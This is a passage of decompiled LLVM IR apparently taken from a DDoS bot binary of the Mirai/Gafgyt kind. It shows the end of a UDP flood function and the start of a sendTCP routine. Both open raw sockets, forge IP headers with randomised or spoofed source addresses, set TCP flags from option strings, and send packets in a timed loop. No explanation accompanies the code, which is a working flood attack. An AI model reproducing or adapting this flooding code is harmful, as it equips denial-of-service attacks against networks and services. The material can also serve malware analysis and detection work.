  %v2_2007c = call i32 @makeRandomStr(i32 %v1_20044, i32 %v3_2005c)
  %v2_20084 = call i32 @__GI_time(i32* null)
  store i32 %v2_20084, i32* %r2.global-to-local, align 4
  %v2_20090 = add i32 %v2_20084, %arg3
  %v2_200a4 = ptrtoint i32* %stack_var_-84 to i32
  br label %dec_label_pc_200a0

dec_label_pc_200a0:                               ; preds = %dec_label_pc_2011c, %dec_label_pc_20110, %dec_label_pc_2005c
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_2005c ], [ 0, %dec_label_pc_20110 ], [ %v1_20120, %dec_label_pc_2011c ]
  %v3_200a0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_200a0, i32* %r2.global-to-local, align 4
  %v6_200c4 = call i32 @__libc_sendto(i32 %v3_20008, i32 %v1_20044, i32 %v3_200a0, i32 0, i32 %v2_200a4, i32 16)
  store i32 %stack_var_-112.0, i32* %r2.global-to-local, align 4
  %v9_200d0 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_200d0, label %dec_label_pc_200d8, label %dec_label_pc_2011c

dec_label_pc_200d8:                               ; preds = %dec_label_pc_200a0
  br i1 %v2_1ff74, label %dec_label_pc_200e4, label %dec_label_pc_200f8

dec_label_pc_200e4:                               ; preds = %dec_label_pc_200d8
  %v0_200e4 = call i32 @rand_cmwc()
  br label %dec_label_pc_200f8

dec_label_pc_200f8:                               ; preds = %dec_label_pc_200d8, %dec_label_pc_200e4
  %v2_200fc = call i32 @__GI_time(i32* null)
  store i32 %v2_200fc, i32* %r2.global-to-local, align 4
  %v8_2010c = icmp sgt i32 %v2_200fc, %v2_20090
  br i1 %v8_2010c, label %dec_label_pc_20510, label %dec_label_pc_20110

dec_label_pc_20110:                               ; preds = %dec_label_pc_200f8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_200a0

dec_label_pc_2011c:                               ; preds = %dec_label_pc_200a0
  %v1_20120 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_200a0

dec_label_pc_2012c:                               ; preds = %dec_label_pc_1ffd0
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_20140 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_20150 = icmp eq i32 %v3_20140, 0
  br i1 %v2_20150, label %dec_label_pc_20158, label %dec_label_pc_20170

dec_label_pc_20158:                               ; preds = %dec_label_pc_2012c
  %v2_2015c = load i32, i32* @global_var_42c60.61, align 4
  %v3_20168 = call i32 @HackerPrint(i32 %v2_2015c, i32 ptrtoint ([27 x i8]* @global_var_38c88.2887 to i32))
  br label %dec_label_pc_2050c

dec_label_pc_20170:                               ; preds = %dec_label_pc_2012c
  store i32 1, i32* %stack_var_-88, align 4
  %v2_20178 = ptrtoint i32* %stack_var_-88 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_20194 = call i32 @__GI_setsockopt(i32 %v3_20140, i32 0, i32 3, i32 %v2_20178, i32 4)
  %v1_2019c = icmp slt i32 %v5_20194, 0
  br i1 %v1_2019c, label %dec_label_pc_201a4, label %dec_label_pc_201bc

dec_label_pc_201a4:                               ; preds = %dec_label_pc_20170
  %v2_201a8 = load i32, i32* @global_var_42c60.61, align 4
  %v3_201b4 = call i32 @HackerPrint(i32 %v2_201a8, i32 ptrtoint ([33 x i8]* @global_var_38ca4.2889 to i32))
  br label %dec_label_pc_2050c

dec_label_pc_201bc:                               ; preds = %dec_label_pc_20170
  br label %dec_label_pc_201c8

dec_label_pc_201c8:                               ; preds = %dec_label_pc_201bc, %dec_label_pc_201c8
  %v1_2020021 = phi i32 [ 49, %dec_label_pc_201bc ], [ %v1_20200, %dec_label_pc_201c8 ]
  %v2_201cc = call i32 @__GI_time(i32* null)
  store i32 %v2_201cc, i32* @r4, align 4
  %v0_201d8 = call i32 @rand_cmwc()
  %v0_201e0 = load i32, i32* @r4, align 4
  %v2_201e0 = xor i32 %v0_201e0, %v0_201d8
  %v1_201e8 = call i32 @srand(i32 %v2_201e0)
  %v0_201ec = call i32 @rand()
  %v1_201f8 = call i32 @init_rand(i32 %v0_201ec)
  %v1_20200 = add nsw i32 %v1_2020021, -1
  %v3_2020c = icmp eq i32 %v1_2020021, 0
  br i1 %v3_2020c, label %dec_label_pc_20214, label %dec_label_pc_201c8

dec_label_pc_20214:                               ; preds = %dec_label_pc_201c8
  %v2_20218 = icmp eq i32 %arg4, 0
  br i1 %v2_20218, label %dec_label_pc_20244, label %dec_label_pc_2022c

dec_label_pc_2022c:                               ; preds = %dec_label_pc_20214
  %v1_20230 = sub i32 32, %arg4
  store i32 %v1_20230, i32* %r2.global-to-local, align 4
  %v1_2023c = shl i32 -1, %v1_20230
  br label %dec_label_pc_20244

dec_label_pc_20244:                               ; preds = %dec_label_pc_20214, %dec_label_pc_2022c
  %storemerge10 = phi i32 [ %v1_2023c, %dec_label_pc_2022c ], [ 0, %dec_label_pc_20214 ]
  %v3_20244 = load i32, i32* %stack_var_0, align 4
  %v1_20248 = add i32 %v3_20244, 28
  %v1_20258 = add i32 %v3_20244, 42
  %v3_2025c = and i32 %v1_20258, -8
  %v1_20264 = load i32, i32* @sp, align 4
  %v2_20264 = sub i32 %v1_20264, %v3_2025c
  %v1_20268 = add i32 %v2_20264, 8
  store i32 %v1_20268, i32* %r2.global-to-local, align 4
  %v1_20274 = add i32 %v2_20264, 15
  %v3_20278 = and i32 %v1_20274, -8
  %v1_20298 = add i32 %v3_20278, 20
  %v5_2029c = inttoptr i32 %v1_20298 to i16*
  %v3_202a0 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_202a0, i32* @r4, align 4
  %v1_202a8 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_202b4 = call i32 @__GI_htonl(i32 %v1_202a8)
  store i32 %v1_202b4, i32* %r2.global-to-local, align 4
  %v3_202bc = load i32, i32* %stack_var_0, align 4
  %v1_202c0 = add i32 %v3_202bc, 8
  %v1_202c4 = load i32, i32* @sp, align 4
  %v2_202c4 = inttoptr i32 %v1_202c4 to i32*
  store i32 %v1_202c0, i32* %v2_202c4, align 4
  %v0_202cc = load i32, i32* @r4, align 4
  %v4_202d4 = inttoptr i32 %v3_20278 to i8*
  %v5_202d4 = call i32 @makeIPPacket(i8* %v4_202d4, i32 %v0_202cc, i32 %v1_202b4, i32 17)
  %v3_202d8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_202d8, 8
  %v3_202ec = urem i32 %fold, 65536
  %v1_202f4 = call i32 @__GI_htons(i32 %v3_202ec)
  %sext = mul i32 %v1_202f4, 65536
  %v1_202f8 = sdiv i32 %sext, 65536
  store i32 %v1_202f8, i32* %r2.global-to-local, align 4
  %v1_20304 = trunc i32 %v1_202f8 to i16
  %v3_20304 = add i32 %v3_20278, 24
  %v4_20304 = inttoptr i32 %v3_20304 to i16*
  store i16 %v1_20304, i16* %v4_20304, align 8
  %v0_20308 = call i32 @rand_cmwc()
  %v3_20314 = urem i32 %v0_20308, 65536
  store i32 %v3_20314, i32* %r2.global-to-local, align 4
  %v1_2031c = trunc i32 %v0_20308 to i16
  store i16 %v1_2031c, i16* %v5_2029c, align 4
  br i1 %v2_1ff74, label %dec_label_pc_2032c, label %dec_label_pc_20344

dec_label_pc_2032c:                               ; preds = %dec_label_pc_20244
  %v0_2032c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_2032c to i16
  br label %dec_label_pc_20360

dec_label_pc_20344:                               ; preds = %dec_label_pc_20244
  %v3_2034c = urem i32 %arg2, 65536
  %v1_20354 = call i32 @__GI_htons(i32 %v3_2034c)
  %extract.t79 = trunc i32 %v1_20354 to i16
  br label %dec_label_pc_20360

dec_label_pc_20360:                               ; preds = %dec_label_pc_2032c, %dec_label_pc_20344
  %v0_2032c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_2032c ], [ %extract.t79, %dec_label_pc_20344 ]
  %v3_20444.pre-phi = phi i32 [ 0, %dec_label_pc_2032c ], [ %v3_2034c, %dec_label_pc_20344 ]
  %v3_20368 = add i32 %v3_20278, 22
  %v4_20368 = inttoptr i32 %v3_20368 to i16*
  store i16 %v0_2032c.sink.off0, i16* %v4_20368, align 2
  store i32 %v1_20298, i32* %r2.global-to-local, align 4
  %v3_20374 = add i32 %v3_20278, 26
  %v4_20374 = inttoptr i32 %v3_20374 to i16*
  store i16 0, i16* %v4_20374, align 2
  %v1_2037c = add i32 %v3_20278, 28
  %v3_20384 = load i32, i32* %stack_var_0, align 4
  %v2_20388 = call i32 @makeRandomStr(i32 %v1_2037c, i32 %v3_20384)
  store i32 %v3_20278, i32* %r2.global-to-local, align 4
  %v1_20398 = or i32 %v3_20278, 2
  %v2_20398 = inttoptr i32 %v1_20398 to i16*
  %v3_20398 = load i16, i16* %v2_20398, align 2
  %v4_20398 = zext i16 %v3_20398 to i32
  %v2_203a4 = inttoptr i32 %v3_20278 to i16*
  %v3_203a4 = call i32 @csum(i16* %v2_203a4, i32 %v4_20398)
  %sext4 = mul i32 %v3_203a4, 65536
  %v1_203a8 = sdiv i32 %sext4, 65536
  store i32 %v1_203a8, i32* %r2.global-to-local, align 4
  %v1_203b4 = trunc i32 %v1_203a8 to i16
  %v3_203b4 = add i32 %v3_20278, 10
  %v4_203b4 = inttoptr i32 %v3_203b4 to i16*
  store i16 %v1_203b4, i16* %v4_203b4, align 2
  %v2_203bc = call i32 @__GI_time(i32* null)
  store i32 %v2_203bc, i32* %r2.global-to-local, align 4
  %v2_203c8 = add i32 %v2_203bc, %arg3
  %v2_203dc = ptrtoint i32* %stack_var_-84 to i32
  %v3_20478 = or i32 %v3_20278, 4
  %v4_20478 = inttoptr i32 %v3_20478 to i16*
  %v2_20498 = add i32 %v3_20278, 12
  %v3_20498 = inttoptr i32 %v2_20498 to i32*
  br label %dec_label_pc_203d8

dec_label_pc_203d8:                               ; preds = %dec_label_pc_204fc, %dec_label_pc_204f0, %dec_label_pc_20360
  %stack_var_-108.0 = phi i32 [ 0, %dec_label_pc_20360 ], [ 0, %dec_label_pc_204f0 ], [ %v1_20500, %dec_label_pc_204fc ]
  store i32 %v3_20278, i32* %r2.global-to-local, align 4
  %v1_203e0 = load i32, i32* @sp, align 4
  %v2_203e0 = inttoptr i32 %v1_203e0 to i32*
  store i32 %v2_203dc, i32* %v2_203e0, align 4
  %v1_203e8 = load i32, i32* @sp, align 4
  %v2_203e8 = add i32 %v1_203e8, 4
  %v3_203e8 = inttoptr i32 %v2_203e8 to i32*
  store i32 16, i32* %v3_203e8, align 4
  %v0_203f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_20248, i32* %r2.global-to-local, align 4
  %v6_203fc = call i32 @__libc_sendto(i32 %v3_20140, i32 %v0_203f0, i32 %v1_20248, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_20400 = call i32 @rand_cmwc()
  %v3_2040c = urem i32 %v0_20400, 65536
  store i32 %v3_2040c, i32* %r2.global-to-local, align 4
  %v1_20414 = trunc i32 %v0_20400 to i16
  store i16 %v1_20414, i16* %v5_2029c, align 4
  br i1 %v2_1ff74, label %dec_label_pc_20424, label %dec_label_pc_2043c

dec_label_pc_20424:                               ; preds = %dec_label_pc_203d8
  %v0_20424 = call i32 @rand_cmwc()
  %extract.t80 = trunc i32 %v0_20424 to i16
  br label %dec_label_pc_20458

dec_label_pc_2043c:                               ; preds = %dec_label_pc_203d8
  %v1_2044c = call i32 @__GI_htons(i32 %v3_20444.pre-phi)
  %extract.t81 = trunc i32 %v1_2044c to i16
  br label %dec_label_pc_20458

dec_label_pc_20458:                               ; preds = %dec_label_pc_20424, %dec_label_pc_2043c
  %v0_20424.sink.off0 = phi i16 [ %extract.t80, %dec_label_pc_20424 ], [ %extract.t81, %dec_label_pc_2043c ]
  %v4_2045c = sext i16 %v0_20424.sink.off0 to i32
  store i32 %v4_2045c, i32* %r2.global-to-local, align 4
  store i16 %v0_20424.sink.off0, i16* %v4_20368, align 2
  %v0_20464 = call i32 @rand_cmwc()
  %v3_20470 = urem i32 %v0_20464, 65536
  store i32 %v3_20470, i32* %r2.global-to-local, align 4
  %v1_20478 = trunc i32 %v0_20464 to i16
  store i16 %v1_20478, i16* %v4_20478, align 4
  %v1_20480 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_2048c = call i32 @__GI_htonl(i32 %v1_20480)
  store i32 %v1_2048c, i32* %v3_20498, align 4
  store i32 %v3_20278, i32* %r2.global-to-local, align 4
  %v3_204a8 = load i16, i16* %v2_20398, align 2
  %v4_204a8 = zext i16 %v3_204a8 to i32
  %v3_204b4 = call i32 @csum(i16* %v2_203a4, i32 %v4_204a8)
  %v1_204c4 = trunc i32 %v3_204b4 to i16
  store i16 %v1_204c4, i16* %v4_203b4, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_204d0 = icmp eq i32 %stack_var_-108.0, %arg6
  br i1 %v9_204d0, label %dec_label_pc_204d8, label %dec_label_pc_204fc

dec_label_pc_204d8:                               ; preds = %dec_label_pc_20458
  %v2_204dc = call i32 @__GI_time(i32* null)
  store i32 %v2_204dc, i32* %r2.global-to-local, align 4
  %v8_204ec = icmp sgt i32 %v2_204dc, %v2_203c8
  br i1 %v8_204ec, label %dec_label_pc_2050c, label %dec_label_pc_204f0

dec_label_pc_204f0:                               ; preds = %dec_label_pc_204d8
  br label %dec_label_pc_203d8

dec_label_pc_204fc:                               ; preds = %dec_label_pc_20458
  %v1_20500 = add i32 %stack_var_-108.0, 1
  store i32 %v1_20500, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_203d8

dec_label_pc_2050c:                               ; preds = %dec_label_pc_204d8, %dec_label_pc_201a4, %dec_label_pc_20158
  %v1_2051826 = phi i32 [ %v3_201b4, %dec_label_pc_201a4 ], [ %v3_20168, %dec_label_pc_20158 ], [ %v2_204dc, %dec_label_pc_204d8 ]
  br label %dec_label_pc_20510

dec_label_pc_20510:                               ; preds = %dec_label_pc_200f8, %dec_label_pc_1ffb0, %dec_label_pc_20038, %dec_label_pc_20020, %dec_label_pc_2050c
  %v1_20518 = phi i32 [ %v3_1ffc0, %dec_label_pc_1ffb0 ], [ 0, %dec_label_pc_20038 ], [ %v3_20030, %dec_label_pc_20020 ], [ %v1_2051826, %dec_label_pc_2050c ], [ %v2_200fc, %dec_label_pc_200f8 ]
  ret i32 %v1_20518

; uselistorder directives
  uselistorder i32 %v1_20500, { 1, 0 }
  uselistorder i32 %v0_20464, { 1, 0 }
  uselistorder i16 %v0_20424.sink.off0, { 1, 0 }
  uselistorder i32 %v0_20400, { 1, 0 }
  uselistorder i32 %v1_203a8, { 1, 0 }
  uselistorder i32 %v3_2034c, { 1, 0 }
  uselistorder i32 %v0_20308, { 1, 0 }
  uselistorder i32 %v1_202f8, { 1, 0 }
  uselistorder i32 %v3_20278, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_20248, { 1, 0 }
  uselistorder i32 %v3_200a0, { 1, 0 }
  uselistorder i32 %stack_var_-112.0, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 ()* @rand, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_20510, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_20458, { 1, 0 }
  uselistorder label %dec_label_pc_20360, { 1, 0 }
  uselistorder label %dec_label_pc_20244, { 1, 0 }
  uselistorder label %dec_label_pc_201c8, { 1, 0 }
  uselistorder label %dec_label_pc_200f8, { 1, 0 }
  uselistorder label %dec_label_pc_1ffb0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 132404, i32* %stack_var_-4, align 4
  %v2_20530 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_20530, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_20564 = icmp eq i32 %arg2, 0
  br i1 %v2_20564, label %dec_label_pc_2056c, label %dec_label_pc_20584

dec_label_pc_2056c:                               ; preds = %entry
  %v0_2056c = call i32 @rand_cmwc()
  br label %dec_label_pc_205a0

dec_label_pc_20584:                               ; preds = %entry
  %v3_2058c = urem i32 %arg2, 65536
  %v1_20594 = call i32 @__GI_htons(i32 %v3_2058c)
  br label %dec_label_pc_205a0

dec_label_pc_205a0:                               ; preds = %dec_label_pc_2056c, %dec_label_pc_20584
  %v3_205b0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_205b8 = icmp eq i32 %v3_205b0, 0
  br i1 %v2_205b8, label %dec_label_pc_205c4, label %dec_label_pc_20c00

dec_label_pc_205c4:                               ; preds = %dec_label_pc_205a0
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_205d8 = bitcast i32* %stack_var_-60 to i8*
  %v4_205d8 = call i32 @__GI_memset(i8* %v3_205d8, i32 0, i32 8)
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_205e8 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_205f8 = icmp eq i32 %v3_205e8, 0
  br i1 %v2_205f8, label %dec_label_pc_20600, label %dec_label_pc_20618

dec_label_pc_20600:                               ; preds = %dec_label_pc_205c4
  %v2_20604 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20610 = call i32 @HackerPrint(i32 %v2_20604, i32 ptrtoint ([27 x i8]* @global_var_38c88.2887 to i32))
  br label %dec_label_pc_20c00

dec_label_pc_20618:                               ; preds = %dec_label_pc_205c4
  store i32 1, i32* %stack_var_-72, align 4
  %v2_20620 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_2063c = call i32 @__GI_setsockopt(i32 %v3_205e8, i32 0, i32 3, i32 %v2_20620, i32 4)
  %v1_20644 = icmp slt i32 %v5_2063c, 0
  br i1 %v1_20644, label %dec_label_pc_2064c, label %dec_label_pc_20664

dec_label_pc_2064c:                               ; preds = %dec_label_pc_20618
  %v2_20650 = load i32, i32* @global_var_42c60.61, align 4
  %v3_2065c = call i32 @HackerPrint(i32 %v2_20650, i32 ptrtoint ([33 x i8]* @global_var_38ca4.2889 to i32))
  br label %dec_label_pc_20c00

dec_label_pc_20664:                               ; preds = %dec_label_pc_20618
  %v2_20668 = icmp eq i32 %arg4, 0
  br i1 %v2_20668, label %dec_label_pc_20694, label %dec_label_pc_2067c

dec_label_pc_2067c:                               ; preds = %dec_label_pc_20664
  %v1_20680 = sub i32 32, %arg4
  store i32 %v1_20680, i32* %r2.global-to-local, align 4
  %v1_2068c = shl i32 -1, %v1_20680
  br label %dec_label_pc_20694

dec_label_pc_20694:                               ; preds = %dec_label_pc_20664, %dec_label_pc_2067c
  %storemerge9 = phi i32 [ %v1_2068c, %dec_label_pc_2067c ], [ 0, %dec_label_pc_20664 ]
  %v1_20698 = add i32 %arg6, 40
  %v1_206a8 = add i32 %arg6, 54
  %v3_206ac = and i32 %v1_206a8, -8
  %v1_206b4 = load i32, i32* @sp, align 4
  %v2_206b4 = sub i32 %v1_206b4, %v3_206ac
  %v1_206c4 = add i32 %v2_206b4, 15
  %v3_206c8 = and i32 %v1_206c4, -8
  store i32 %v3_206c8, i32* %r2.global-to-local, align 4
  %v1_206e8 = add i32 %v3_206c8, 20
  %v5_206ec = inttoptr i32 %v1_206e8 to i16*
  %v3_206f0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_206f0, i32* @r4, align 4
  %v1_206f8 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_20704 = call i32 @__GI_htonl(i32 %v1_206f8)
  store i32 %v1_20704, i32* %r2.global-to-local, align 4
  %v1_20710 = add i32 %arg6, 20
  %v1_20714 = load i32, i32* @sp, align 4
  %v2_20714 = inttoptr i32 %v1_20714 to i32*
  store i32 %v1_20710, i32* %v2_20714, align 4
  %v0_2071c = load i32, i32* @r4, align 4
  %v4_20724 = inttoptr i32 %v3_206c8 to i8*
  %v5_20724 = call i32 @makeIPPacket(i8* %v4_20724, i32 %v0_2071c, i32 %v1_20704, i32 6)
  %v0_20728 = call i32 @rand_cmwc()
  %v3_20734 = urem i32 %v0_20728, 65536
  store i32 %v3_20734, i32* %r2.global-to-local, align 4
  %v1_2073c = trunc i32 %v0_20728 to i16
  store i16 %v1_2073c, i16* %v5_206ec, align 4
  %v0_20740 = call i32 @rand_cmwc()
  %v2_2074c = add i32 %v3_206c8, 24
  %v3_2074c = inttoptr i32 %v2_2074c to i32*
  store i32 %v0_20740, i32* %v3_2074c, align 8
  %v2_20758 = add i32 %v3_206c8, 28
  %v3_20758 = inttoptr i32 %v2_20758 to i32*
  store i32 0, i32* %v3_20758, align 4
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v1_20760 = add i32 %v3_206c8, 32
  %v2_20760 = inttoptr i32 %v1_20760 to i8*
  %v3_20760 = load i8, i8* %v2_20760, align 8
  %v1_2076c = urem i8 %v3_20760, 16
  %v1_20770 = or i8 %v1_2076c, 80
  store i8 %v1_20770, i8* %v2_20760, align 8
  %v3_20780 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38cc8.2894 to i32), i32* @r1, align 4
  %v3_2078c = inttoptr i32 %v3_20780 to i8*
  %v4_2078c = call i32 @__GI_strcoll(i8* %v3_2078c, i32 ptrtoint ([4 x i8]* @global_var_38cc8.2894 to i32))
  %v2_20794 = icmp eq i32 %v4_2078c, 0
  br i1 %v2_20794, label %dec_label_pc_2079c, label %dec_label_pc_20854

dec_label_pc_2079c:                               ; preds = %dec_label_pc_20694
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v1_207a0 = add i32 %v3_206c8, 33
  %v2_207a0 = inttoptr i32 %v1_207a0 to i8*
  %v3_207a0 = load i8, i8* %v2_207a0, align 1
  %v1_207b0 = or i8 %v3_207a0, 2
  store i8 %v1_207b0, i8* %v2_207a0, align 1
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v3_207c4 = load i8, i8* %v2_207a0, align 1
  %v1_207d4 = or i8 %v3_207c4, 4
  store i8 %v1_207d4, i8* %v2_207a0, align 1
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v3_207e8 = load i8, i8* %v2_207a0, align 1
  %v1_207f8 = or i8 %v3_207e8, 1
  store i8 %v1_207f8, i8* %v2_207a0, align 1
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v3_2080c = load i8, i8* %v2_207a0, align 1
  %v1_2081c = or i8 %v3_2080c, 16
  store i8 %v1_2081c, i8* %v2_207a0, align 1
  store i32 %v1_206e8, i32* %r2.global-to-local, align 4
  %v3_20830 = load i8, i8* %v2_207a0, align 1
  %v1_20840 = or i8 %v3_20830, 8
  store i8 %v1_20840, i8* %v2_207a0, align 1
  br label %dec_label_pc_209fc

dec_label_pc_20854:                               ; preds = %dec_label_pc_20694
  %v3_20854 = load i32, i32* %stack_var_0, align 4
  %v2_20860 = call i32 @__GI_strtok(i32 %v3_20854, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_209f418 = icmp eq i32 %v2_20860, 0
  br i1 %v2_209f418, label %dec_label_pc_209fc, label %dec_label_pc_20870.lr.ph

dec_label_pc_20870.lr.ph:                         ; preds = %dec_label_pc_20854
  %v1_20890 = add i32 %v3_206c8, 33
  %v2_20890 = inttoptr i32 %v1_20890 to i8*
  br label %dec_label_pc_20870

dec_label_pc_20870:                               ; preds = %dec_label_pc_20870.lr.ph, %dec_label_pc_209dc
  %storemerge1319 = phi i32 [ %v2_20860, %dec_label_pc_20870.lr.ph ], [ %v2_209e4, %dec_label_pc_209dc ]
  store i32 ptrtoint ([4 x i8]* @global_var_38cd0.2898 to i32), i32* @r1, align 4
  %v3_2087c = inttoptr i32 %storemerge1319 to i8*
  %v4_2087c = call i32 @__GI_strcoll(i8* %v3_2087c, i32 ptrtoint ([4 x i8]* @global_var_38cd0.2898 to i32))
  %v2_20884 = icmp eq i32 %v4_2087c, 0
  br i1 %v2_20884, label %dec_label_pc_2088c, label %dec_label_pc_208b4

dec_label_pc_2088c:                               ; preds = %dec_label_pc_20870
  %v3_20890 = load i8, i8* %v2_20890, align 1
  %v4_20898 = zext i8 %v3_20890 to i32
  %v1_208a0 = or i32 %v4_20898, 2
  store i32 %v1_208a0, i32* %r2.global-to-local, align 4
  %v1_208ac = trunc i32 %v1_208a0 to i8
  store i8 %v1_208ac, i8* %v2_20890, align 1
  br label %dec_label_pc_209dc

dec_label_pc_208b4:                               ; preds = %dec_label_pc_20870
  store i32 ptrtoint ([4 x i8]* @global_var_38cd4.2900 to i32), i32* @r1, align 4
  %v4_208c0 = call i32 @__GI_strcoll(i8* %v3_2087c, i32 ptrtoint ([4 x i8]* @global_var_38cd4.2900 to i32))
  %v2_208c8 = icmp eq i32 %v4_208c0, 0
  br i1 %v2_208c8, label %dec_label_pc_208d0, label %dec_label_pc_208f8

dec_label_pc_208d0:                               ; preds = %dec_label_pc_208b4
  %v3_208d4 = load i8, i8* %v2_20890, align 1
  %v4_208dc = zext i8 %v3_208d4 to i32
  %v1_208e4 = or i32 %v4_208dc, 4
  store i32 %v1_208e4, i32* %r2.global-to-local, align 4
  %v1_208f0 = trunc i32 %v1_208e4 to i8
  store i8 %v1_208f0, i8* %v2_20890, align 1
  br label %dec_label_pc_209dc

dec_label_pc_208f8:                               ; preds = %dec_label_pc_208b4
  store i32 ptrtoint ([4 x i8]* @global_var_38cd8.2902 to i32), i32* @r1, align 4
  %v4_20904 = call i32 @__GI_strcoll(i8* %v3_2087c, i32 ptrtoint ([4 x i8]* @global_var_38cd8.2902 to i32))
  %v2_2090c = icmp eq i32 %v4_20904, 0
  br i1 %v2_2090c, label %dec_label_pc_20914, label %dec_label_pc_2093c

dec_label_pc_20914:                               ; preds = %dec_label_pc_208f8
  %v3_20918 = load i8, i8* %v2_20890, align 1
  %v4_20920 = zext i8 %v3_20918 to i32
  %v1_20928 = or i32 %v4_20920, 1
  store i32 %v1_20928, i32* %r2.global-to-local, align 4
  %v1_20934 = trunc i32 %v1_20928 to i8
  store i8 %v1_20934, i8* %v2_20890, align 1
  br label %dec_label_pc_209dc

dec_label_pc_2093c:                               ; preds = %dec_label_pc_208f8
  store i32 ptrtoint ([4 x i8]* @global_var_38cdc.2904 to i32), i32* @r1, align 4
  %v4_20948 = call i32 @__GI_strcoll(i8* %v3_2087c, i32 ptrtoint ([4 x i8]* @global_var_38cdc.2904 to i32))
  %v2_20950 = icmp eq i32 %v4_20948, 0
  br i1 %v2_20950, label %dec_label_pc_20958, label %dec_label_pc_20980

dec_label_pc_20958:                               ; preds = %dec_label_pc_2093c
  %v3_2095c = load i8, i8* %v2_20890, align 1
  %v4_20964 = zext i8 %v3_2095c to i32
  %v1_2096c = or i32 %v4_20964, 16
  store i32 %v1_2096c, i32* %r2.global-to-local, align 4
  %v1_20978 = trunc i32 %v1_2096c to i8
  store i8 %v1_20978, i8* %v2_20890, align 1
  br label %dec_label_pc_209dc

dec_label_pc_20980:                               ; preds = %dec_label_pc_2093c
  store i32 ptrtoint ([4 x i8]* @global_var_38ce0.2906 to i32), i32* @r1, align 4
  %v4_2098c = call i32 @__GI_strcoll(i8* %v3_2087c, i32 ptrtoint ([4 x i8]* @global_var_38ce0.2906 to i32))
  %v2_20994 = icmp eq i32 %v4_2098c, 0
  br i1 %v2_20994, label %dec_label_pc_2099c, label %dec_label_pc_209c4

dec_label_pc_2099c:                               ; preds = %dec_label_pc_20980
  %v3_209a0 = load i8, i8* %v2_20890, align 1
  %v4_209a8 = zext i8 %v3_209a0 to i32
  %v1_209b0 = or i32 %v4_209a8, 8
  store i32 %v1_209b0, i32* %r2.global-to-local, align 4
  %v1_209bc = trunc i32 %v1_209b0 to i8
  store i8 %v1_209bc, i8* %v2_20890, align 1
  br label %dec_label_pc_209dc

dec_label_pc_209c4:                               ; preds = %dec_label_pc_20980
  %v2_209c8 = load i32, i32* @global_var_42c60.61, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_209d8 = call i32 @HackerPrint(i32 %v2_209c8, i32 ptrtoint ([18 x i8]* @global_var_38ce4.2908 to i32))
  br label %dec_label_pc_209dc

dec_label_pc_209dc:                               ; preds = %dec_label_pc_2099c, %dec_label_pc_20958, %dec_label_pc_20914, %dec_label_pc_208d0, %dec_label_pc_2088c, %dec_label_pc_209c4
  %v2_209e4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_209f4 = icmp eq i32 %v2_209e4, 0
